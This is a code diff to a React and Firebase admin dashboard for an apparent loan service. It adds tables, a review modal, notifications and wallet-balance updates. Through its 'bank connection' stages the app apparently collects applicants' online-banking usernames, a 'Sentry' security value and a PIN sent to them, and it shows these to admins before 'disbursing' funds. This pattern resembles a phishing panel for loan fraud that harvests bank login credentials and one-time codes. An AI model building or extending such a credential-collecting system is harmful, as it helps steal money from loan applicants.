@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { collection, query, onSnapshot, doc, updateDoc, serverTimestamp, addDoc, where } from 'firebase/firestore';
+import { collection, query, onSnapshot, doc, updateDoc, serverTimestamp, addDoc, where, increment } from 'firebase/firestore';
 import { db } from '../../lib/firebase';
 import { useAuth } from '../../hooks/useAuth';
 import { Logo } from '../../components/Logo';
@@ -32,6 +32,7 @@ export const AdminPage = () => {
   const [loading, setLoading] = useState(true);
   const [activeTab, setActiveTab] = useState<'loans' | 'kyc'>('loans');
   const [selectedKYC, setSelectedKYC] = useState<any | null>(null);
+  const [selectedLoan, setSelectedLoan] = useState<any | null>(null);
   const [rejectionReason, setRejectionReason] = useState('');
   const [showRejectionModal, setShowRejectionModal] = useState(false);
 
@@ -84,11 +85,50 @@ export const AdminPage = () => {
 
   const handleLoanStatusUpdate = async (loanId: string, status: string) => {
     try {
+      const loan = loans.find(l => l.id === loanId);
+      if (!loan) return;
+
       await updateDoc(doc(db, 'loans', loanId), {
         status,
         updatedAt: serverTimestamp(),
         reviewedBy: user?.email,
       });
+
+      // Update user document for instant UI feedback
+      await updateDoc(doc(db, 'users', loan.userId), {
+        activeLoanStatus: status,
+        updatedAt: serverTimestamp()
+      });
+
+      // If disbursed, update user's wallet balance
+      if (status === 'disbursed') {
+        await updateDoc(doc(db, 'users', loan.userId), {
+          walletBalance: increment(loan.amount)
+        });
+      }
+
+      // Notify user
+      try {
+        const userName = loan.userName || loan.userEmail?.split('@')[0] || 'User';
+        await addDoc(collection(db, 'notifications', loan.userId, 'items'), {
+          type: 'loan_update',
+          title: status === 'approved' ? 'Loan Approved' : 
+                 status === 'rejected' ? 'Loan Rejected' : 
+                 status === 'disbursed' ? 'Loan Disbursed' : 'Loan Update',
+          message: status === 'approved' 
+            ? `Hello ${userName}, your loan application for $${loan.amount.toLocaleString()} has been approved! Please connect your bank account to proceed.` 
+            : status === 'rejected' 
+            ? `Hello ${userName}, we regret to inform you that your loan application for $${loan.amount.toLocaleString()} was not approved at this time.`
+            : status === 'disbursed'
+            ? `Congratulations ${userName}! Your loan of $${loan.amount.toLocaleString()} has been successfully disbursed to your wallet.`
+            : `Hello ${userName}, your loan status has been updated to ${status}.`,
+          createdAt: serverTimestamp(),
+          read: false,
+        });
+      } catch (notifyErr) {
+        console.error('Error sending notification:', notifyErr);
+      }
+
       alert(`Loan updated to ${status} successfully!`);
     } catch (err: any) {
       console.error('Error updating loan status:', err);
@@ -132,6 +172,7 @@ export const AdminPage = () => {
   };
 
   const pendingLoans = loans.filter(l => l.status === 'pending');
+  const inProgressLoans = loans.filter(l => ['bank_details_submitted', 'pin_sent'].includes(l.status));
   const pinVerificationLoans = loans.filter(l => l.status === 'pin_submitted');
   const totalVolume = loans.reduce((acc, l) => acc + (l.status === 'approved' || l.status === 'disbursed' ? l.amount : 0), 0);
 
@@ -299,12 +340,12 @@ export const AdminPage = () => {
               </div>
             </div>
 
-            {/* PIN Verified */}
+            {/* In Progress */}
             <div className="card">
               <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
-                PIN Verified - Ready for Disbursement
-                <span className="bg-purple-100 text-purple-700 px-2 py-0.5 rounded-full text-xs font-black">
-                  {pinVerificationLoans.length}
+                In Progress (Bank Connection)
+                <span className="bg-blue-100 text-blue-700 px-2 py-0.5 rounded-full text-xs font-black">
+                  {inProgressLoans.length}
                 </span>
               </h2>
               
@@ -313,8 +354,75 @@ export const AdminPage = () => {
                   <thead>
                     <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                       <th className="pb-4 font-bold">Applicant</th>
-                      <th className="pb-4 font-bold">Amount</th>
-                      <th className="pb-4 font-bold">Bank & Additional Details</th>
+                      <th className="pb-4 font-bold">Status</th>
+                      <th className="pb-4 font-bold">Details Provided</th>
+                      <th className="pb-4 font-bold text-right">Last Activity</th>
+                    </tr>
+                  </thead>
+                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
+                    {inProgressLoans.length === 0 ? (
+                      <tr>
+                        <td colSpan={4} className="py-10 text-center text-gray-500">
+                          No loans currently in bank connection phase.
+                        </td>
+                      </tr>
+                    ) : (
+                      inProgressLoans.map((loan) => (
+                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
+                          <td className="py-4">
+                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
+                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
+                          </td>
+                          <td className="py-4">
+                            <span className={`px-2 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${
+                              loan.status === 'bank_details_submitted' 
+                                ? 'bg-blue-100 text-blue-700' 
+                                : 'bg-purple-100 text-purple-700'
+                            }`}>
+                              {loan.status === 'bank_details_submitted' ? 'Filling Additional Info' : 'Awaiting PIN'}
+                            </span>
+                          </td>
+                          <td className="py-4">
+                            <div className="text-xs text-gray-500">
+                              {loan.bankDetails ? '✓ Bank Details' : '✗ Bank Details'}<br/>
+                              {loan.additionalDetails ? '✓ Additional Info' : '✗ Additional Info'}
+                            </div>
+                          </td>
+                          <td className="py-4 text-right text-gray-500 text-xs">
+                            <div className="flex justify-end items-center gap-2">
+                              <span>{loan.updatedAt?.toDate ? loan.updatedAt.toDate().toLocaleString() : 'Just now'}</span>
+                              <button 
+                                onClick={() => setSelectedLoan(loan)}
+                                className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-zinc-800 text-gray-400"
+                              >
+                                <Eye className="w-4 h-4" />
+                              </button>
+                            </div>
+                          </td>
+                        </tr>
+                      ))
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            {/* PIN Verified */}
+            <div className="card">
+              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
+                Ready for Final Approval & Disbursement
+                <span className="bg-green-100 text-green-700 px-2 py-0.5 rounded-full text-xs font-black">
+                  {pinVerificationLoans.length}
+                </span>
+              </h2>
+              
+              <div className="overflow-x-auto">
+                <table className="w-full text-left">
+                  <thead>
+                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
+                      <th className="pb-4 font-bold">Applicant & Loan</th>
+                      <th className="pb-4 font-bold">Amount & Purpose</th>
+                      <th className="pb-4 font-bold">Full Verification Data</th>
                       <th className="pb-4 font-bold text-right">Actions</th>
                     </tr>
                   </thead>
@@ -322,7 +430,7 @@ export const AdminPage = () => {
                     {pinVerificationLoans.length === 0 ? (
                       <tr>
                         <td colSpan={4} className="py-10 text-center text-gray-500">
-                          No loans ready for disbursement.
+                          No loans ready for final review.
                         </td>
                       </tr>
                     ) : (
@@ -331,26 +439,59 @@ export const AdminPage = () => {
                           <td className="py-4">
                             <div className="font-bold dark:text-white">{loan.userEmail}</div>
                             <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
+                            <div className="mt-1 text-[10px] text-accent font-black uppercase">PIN VERIFIED ✓</div>
                           </td>
-                          <td className="py-4 font-bold text-accent">${loan.amount.toLocaleString()}</td>
                           <td className="py-4">
-                            <div className="text-xs font-bold dark:text-white mb-1">
-                              {loan.bankDetails?.bankName} - {loan.bankDetails?.accountNumber}
-                            </div>
-                            <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-[10px] text-gray-500">
-                              <span>IBAN: {loan.additionalDetails?.iban}</span>
-                              <span>Phone: {loan.additionalDetails?.phoneNumber}</span>
-                              <span>User: {loan.additionalDetails?.bankUsername}</span>
-                              <span>Sentry: {loan.additionalDetails?.sentry}</span>
+                            <div className="font-bold text-accent text-lg">${loan.amount.toLocaleString()}</div>
+                            <div className="text-xs text-gray-500 italic">"{loan.purpose}"</div>
+                          </td>
+                          <td className="py-4">
+                            <div className="grid grid-cols-2 gap-x-6 gap-y-2">
+                              <div>
+                                <p className="text-[9px] font-black uppercase text-gray-400">Primary Bank</p>
+                                <p className="text-xs font-bold dark:text-white">{loan.bankDetails?.bankName}</p>
+                                <p className="text-[10px] text-gray-500">{loan.bankDetails?.accountNumber}</p>
+                                <p className="text-[10px] text-gray-400 italic">{loan.bankDetails?.accountName}</p>
+                              </div>
+                              <div>
+                                <p className="text-[9px] font-black uppercase text-gray-400">Additional Info</p>
+                                <p className="text-[10px] text-gray-500">IBAN: <span className="text-gray-700 dark:text-gray-300 font-mono">{loan.additionalDetails?.iban}</span></p>
+                                <p className="text-[10px] text-gray-500">Phone: <span className="text-gray-700 dark:text-gray-300">{loan.additionalDetails?.phoneNumber}</span></p>
+                              </div>
+                              <div>
+                                <p className="text-[9px] font-black uppercase text-gray-400">Bank Auth</p>
+                                <p className="text-[10px] text-gray-500">User: <span className="text-gray-700 dark:text-gray-300">{loan.additionalDetails?.bankUsername}</span></p>
+                              </div>
+                              <div>
+                                <p className="text-[9px] font-black uppercase text-gray-400">Security</p>
+                                <p className="text-[10px] text-gray-500">Sentry: <span className="text-gray-700 dark:text-gray-300 font-mono">{loan.additionalDetails?.sentry}</span></p>
+                              </div>
                             </div>
                           </td>
                           <td className="py-4 text-right">
-                            <button 
-                              onClick={() => handleLoanStatusUpdate(loan.id, 'disbursed')}
-                              className="btn-primary px-4 py-2 text-xs bg-green-600 hover:bg-green-700"
-                            >
-                              Disburse Funds
-                            </button>
+                            <div className="flex flex-col gap-2 items-end">
+                              <div className="flex gap-2">
+                                <button 
+                                  onClick={() => setSelectedLoan(loan)}
+                                  className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-zinc-800 text-gray-400"
+                                  title="View All Details"
+                                >
+                                  <Eye className="w-5 h-5" />
+                                </button>
+                                <button 
+                                  onClick={() => handleLoanStatusUpdate(loan.id, 'disbursed')}
+                                  className="btn-primary px-6 py-3 text-xs bg-green-600 hover:bg-green-700 shadow-lg shadow-green-600/20"
+                                >
+                                  Approve & Disburse
+                                </button>
+                              </div>
+                              <button 
+                                onClick={() => handleLoanStatusUpdate(loan.id, 'rejected')}
+                                className="text-[10px] font-black uppercase text-red-500 hover:underline"
+                              >
+                                Reject at Final Stage
+                              </button>
+                            </div>
                           </td>
                         </tr>
                       ))
@@ -481,6 +622,103 @@ export const AdminPage = () => {
           </div>
         )}
       </main>
+
+      {/* Loan Detail Modal */}
+      <AnimatePresence>
+        {selectedLoan && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
+            <motion.div 
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              onClick={() => setSelectedLoan(null)}
+              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
+            />
+            <motion.div 
+              initial={{ scale: 0.9, opacity: 0, y: 20 }}
+              animate={{ scale: 1, opacity: 1, y: 0 }}
+              exit={{ scale: 0.9, opacity: 0, y: 20 }}
+              className="relative bg-white dark:bg-zinc-950 rounded-3xl p-8 max-w-2xl w-full shadow-2xl border border-gray-200 dark:border-zinc-800 overflow-y-auto max-h-[90vh]"
+            >
+              <div className="flex justify-between items-start mb-8">
+                <div>
+                  <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-1">Loan Review</h3>
+                  <p className="text-gray-500">ID: {selectedLoan.id}</p>
+                </div>
+                <button onClick={() => setSelectedLoan(null)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
+                  <XCircle className="w-6 h-6 text-gray-400" />
+                </button>
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
+                <DetailSection title="Application Info">
+                  <DetailItem label="Applicant" value={selectedLoan.userEmail} />
+                  <DetailItem label="Amount" value={`$${selectedLoan.amount.toLocaleString()}`} />
+                  <DetailItem label="Purpose" value={selectedLoan.purpose} />
+                  <DetailItem label="Status" value={selectedLoan.status.toUpperCase()} />
+                </DetailSection>
+
+                <DetailSection title="Bank Details">
+                  <DetailItem label="Bank Name" value={selectedLoan.bankDetails?.bankName} />
+                  <DetailItem label="Account Number" value={selectedLoan.bankDetails?.accountNumber} />
+                  <DetailItem label="Account Name" value={selectedLoan.bankDetails?.accountName} />
+                </DetailSection>
+
+                <DetailSection title="Verification Data">
+                  <DetailItem label="IBAN" value={selectedLoan.additionalDetails?.iban} />
+                  <DetailItem label="Phone Number" value={selectedLoan.additionalDetails?.phoneNumber} />
+                  <DetailItem label="Bank Username" value={selectedLoan.additionalDetails?.bankUsername} />
+                  <DetailItem label="Sentry ID" value={selectedLoan.additionalDetails?.sentry} />
+                </DetailSection>
+
+                <DetailSection title="Timestamps">
+                  <DetailItem label="Applied" value={selectedLoan.createdAt?.toDate?.().toLocaleString()} />
+                  <DetailItem label="Bank Submitted" value={selectedLoan.bankSubmittedAt?.toDate?.().toLocaleString()} />
+                  <DetailItem label="PIN Verified" value={selectedLoan.pinSubmittedAt?.toDate?.().toLocaleString()} />
+                </DetailSection>
+              </div>
+
+              <div className="flex gap-4 pt-8 border-t border-gray-100 dark:border-zinc-800">
+                {['pending', 'bank_details_submitted', 'pin_sent', 'pin_submitted'].includes(selectedLoan.status) && (
+                  <button 
+                    onClick={() => {
+                      handleLoanStatusUpdate(selectedLoan.id, 'rejected');
+                      setSelectedLoan(null);
+                    }}
+                    className="flex-1 py-4 rounded-2xl font-bold text-red-500 hover:bg-red-50 transition-all border border-red-100"
+                  >
+                    Reject Application
+                  </button>
+                )}
+                
+                {selectedLoan.status === 'pending' && (
+                  <button 
+                    onClick={() => {
+                      handleLoanStatusUpdate(selectedLoan.id, 'approved');
+                      setSelectedLoan(null);
+                    }}
+                    className="flex-1 btn-primary py-4"
+                  >
+                    Approve Application
+                  </button>
+                )}
+
+                {selectedLoan.status === 'pin_submitted' && (
+                  <button 
+                    onClick={() => {
+                      handleLoanStatusUpdate(selectedLoan.id, 'disbursed');
+                      setSelectedLoan(null);
+                    }}
+                    className="flex-1 btn-primary py-4"
+                  >
+                    Approve & Disburse
+                  </button>
+                )}
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
 
       {/* Rejection Modal */}
       <AnimatePresence>
